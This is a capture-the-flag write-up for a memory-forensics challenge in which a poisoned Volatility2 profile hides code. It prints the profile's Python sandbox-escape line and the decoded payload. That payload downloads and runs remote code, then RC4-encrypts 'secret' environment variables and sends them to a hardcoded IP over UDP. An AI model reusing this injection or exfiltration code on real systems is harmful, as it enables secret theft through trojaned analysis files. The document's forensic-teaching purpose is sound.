# Mack'os

[< Go back](../../README.md)

## Description

R : La forensique mémoire avec Volatility2 est ma grande passion, et ce depuis sa sortie en août 2006 ! Récemment, j'ai même participé à un concours d'analyse mémoire sur un chat IRC assez rétro. Même si j'ai eu quelques difficultés à trouver le bon profil à utiliser, un utilisateur nommé "jonas_kahnwald44" a pu m'en fournir un fonctionnel. Maintenant que j'en parle, j'ai remarqué un message inattendu lors de l'exécution de Volatility2 avec ce profil. Pourriez-vous jeter un oeil à cette capture réseau réalisée sur mon serveur d'analyse ?

EN : Memory forensics with Volatility2 has been my great passion since its release in August 2006! Recently, I even participated in a memory analysis contest on a rather retro IRC chat. Although I had some difficulties finding the right profile to use, a user named "jonas_kahnwald44" was able to provide me with a functional one. Now that I mention it, I noticed an unexpected message while running Volatility2 with this profile. Could you take a look at this network capture made on my analysis server?

Author: Abyss Watcher

all files in [resources/](./resources) were provided.

## Challenge

Looking at the network logs from [Mackos.pcap](resources/Mackos.pcap) we see volatility logs in `tcp.stream eq 0` at the end we see some sort of IRC chat logs

```
analyst@forensic_server:~$ cp file_server/good_profile.zip volatility/volatility/plugins/overlays/mac/

analyst@forensic_server:~$ python2 volatility/vol.py -f evidences/mac_dump.raw --profile Macgood_profilex64 mac_version

<c_dump.raw --profile Macgood_profilex64 mac_version
Volatility Foundation Volatility Framework 2.6.1
hello fellow analyst ! just checking a few things do not mind :)
Darwin Kernel Version 13.2.0: Thu Apr 17 23:03:13 PDT 2014; root:xnu-2422.100.13~1/RELEASE_X86_64
analyst@forensic_server:~$
```

The other person executed a python2 script, we can download [good_profile.zip](good_profile.zip) to view what happened, unzipping it and looking at [dwarf.txt.conv.vtypes](dwarf.txt.conv.vtypes) we see:

```
'custom_element': [0x2, [[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo "hello fellow analyst ! just checking a few things do not mind :)" && python2 -c \'import base64; exec(base64.b64decode("IyEvdXN...Q5NSkpCg=="))\'')]],
```

We can decode this huge base64 into another python2 program:

```py

# _=((()>[])+(()>[]));
# __=(((_<<_)<<_)*_);
# ___=('c%'[::  ... very long ...  )>[]))))))

# Deciphered:

_=2
__=64
___="https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071/raw/a8f66f1f9e77b2db28bab1328db274f05722b535/rc4.py"

m = types.ModuleType('')
exec(urlopen(___).read().decode('utf-8'), m.__dict__)
k = '%d' % int(time.time())
enc = m.encrypt(
  str(
    [{a:b} for a,b in os.environ.items() if a.lower().startswith('secret')]
  ),
  k
)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(enc, ('83.84.179.243', 16495))

```

This program steals the users "secret" environment variables trough an websocket, they get encrypted trough the rc4 algorithm (from the gist) and the secret key which is the current timestamp.

Inside wireshark we find the encrypted text that was exfiltrated:

```
0X570X6A0XC50X5F0XDE0XC60X2D0XED0X7A0XF0XD90X850XBD0XC40X2A0XD60XE00X6E0X8A0XCC0X660XDB0XDE0X570X430XD20XB10X700XAC0X200X4A0XE30X4E0X620X5B0XBD0XF60X140XDD0X900XD50X2E0XF00XF90X260X6D0X490X830XAB0X310XAA0X3A0XD10X2A0X490X850X5E0X900XCE0X530X3B0XF40X480XAD0X640X540X550X330X530XF70X6A0XB80XE7
```

We can start by downloading the gist ourselves and trying to find the timestamp used for the key, to do that we can enamble UTC timestamps in wireshark and grab a large range of times, we can quickly bruteforce a batch.

```py
key = 1708172370
    while True:
        result = decrypt(ciphertext, str(key))
        # if key > 1708173370:
        #     break
        if 'secret' in result:
            print(result)
            break
        key += 1
# [{'secret_technique': '  MCTF{my_secret_f0rens1c_tool_is_ripgrep!.!.!}'}]
```
